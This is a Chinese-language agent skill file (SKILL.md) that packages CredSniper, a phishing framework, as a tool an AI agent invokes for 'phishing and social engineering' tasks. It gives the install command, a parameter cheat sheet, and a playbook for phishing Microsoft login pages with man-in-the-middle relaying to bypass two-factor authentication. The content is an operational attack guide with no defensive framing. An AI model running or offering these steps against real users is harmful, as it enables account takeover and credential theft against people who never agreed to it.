---
name: credsniper-phish
description: 渗透工具 skill:CredSniper 的安装、参数速查与攻击场景 playbook。当任务涉及 钓鱼与社会工程 需要调用 CredSniper 时使用。
when-to-use: 渗透工具 skill:CredSniper 的安装、参数速查与攻击场景 playbook。当任务涉及 钓鱼与社会工程 需要调用 CredSniper 时使用。
---

# CredSniper

- 攻击大类:C08 钓鱼与社会工程
- 上游仓库:https://github.com/ustayready/CredSniper
- 上游 License:Apache-2.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/ustayready/CredSniper && cd CredSniper && pip install -r requirements.txt
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `python3 credsniper.py --url https://login.microsoftonline.com -p 8443` | 2FA 钓鱼 |
| `--url u -p port -s` | SSL |
| `-o out.txt` | 输出 |

## 攻击场景 Playbook

### OAuth/2FA 钓鱼

```bash
python3 credsniper.py --url https://login.microsoftonline.com
# 中间人实时转发,过 2FA
```

## 注意事项

支持 2FA 的钓鱼框架。
